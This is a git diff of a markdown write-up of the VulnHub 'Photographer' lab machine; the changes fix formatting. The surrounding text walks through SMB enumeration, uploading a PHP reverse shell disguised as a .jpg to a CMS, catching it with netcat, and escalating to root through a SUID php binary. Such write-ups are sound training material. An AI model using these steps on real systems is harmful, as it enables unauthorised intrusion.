@@ -20,7 +20,7 @@ Photographer was the last machine I did before I took my OSCP exam so it seemed 
 
 Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.
 
-<pre>
+
 ```
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
@@ -65,9 +65,9 @@ Host script results:
 |_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds                                                                 
+Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
 ```
-</pre>
+
 
 The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.
 
@@ -86,7 +86,6 @@ Looking at the exploit, the POST request makes a call to **/admin/**. Going to t
 ![Login](/assets/images/photographer/login.png)
 
 Using smbclient and logging in anonymously shows one share in particular that looks interesting 'sambashare'. 
-
 <pre>
 ```
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
@@ -117,9 +116,7 @@ getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 K
 smb: \> 
 ```
 </pre>
-
 Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.
-
 <pre>
 ```
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
@@ -139,10 +136,9 @@ Hi Daisa!
 Your site is ready now.
 Don\'t forget your secret, my babygirl ;)
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $                                                                                                                       
+└──╼ $
 ```
 </pre>
-
 'babygirl' looks to be a hint to the password and I now have 2 users and email addresses:
 
 - Agi Clarence - agi@photographer.com
@@ -161,26 +157,22 @@ Going back to the exploit from earlier, it looks like I can upload a PHP file by
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
-└──╼ $mv php-reverse-shell.php shell.php.jpg                                                                                 
+└──╼ $mv php-reverse-shell.php shell.php.jpg
 ```
 </pre>
-
 I update the script with my local IP and port details.
-
 <pre>
 ```
 $ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS                                                                                           
+$port = 1234;       // CHANGE THIS
 ```
 </pre>
-
 Start a netcat listener ready to catch the shell.
-
 <pre>
 ```
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $sudo nc -nvlp 443
-listening on [any] 443 ...                                                                                                   
+listening on [any] 443 ...
 ```
 </pre>
 
@@ -201,7 +193,6 @@ I have a shell as www-data! First thing I always do is upgrade it to a more stab
 ![Shell](/assets/images/photographer/shell.png)
 
 The first flag can be found in Daisa's user directory.
-
 <pre>
 ```
 www-data@photographer:/$ cd home/daisa/
@@ -210,7 +201,7 @@ Desktop    Downloads  Pictures  Templates  examples.desktop
 Documents  Music      Public    Videos     user.txt
 www-data@photographer:/home/daisa$ cat user.txt 
 d41d8cd98f00{REDACTED}
-www-data@photographer:/home/daisa$                                                                                           
+www-data@photographer:/home/daisa$
 ```
 </pre>
 
@@ -231,8 +222,8 @@ First I will check [GTFOBins](https://gtfobins.github.io), searching PHP.
 ![gtfobins](/assets/images/photographer/phpsuid.png)
 
 Lets give it a go.
-
 <pre>
+
 ```
 www-data@photographer:/tmp$ CMD="/bin/sh"
 www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
@@ -283,5 +274,6 @@ Follow me at: http://v1n1v131r4.com
 d41d8cd98f00{REDACTED}
 #
 ```
-<pre>
+</pre>
+
 
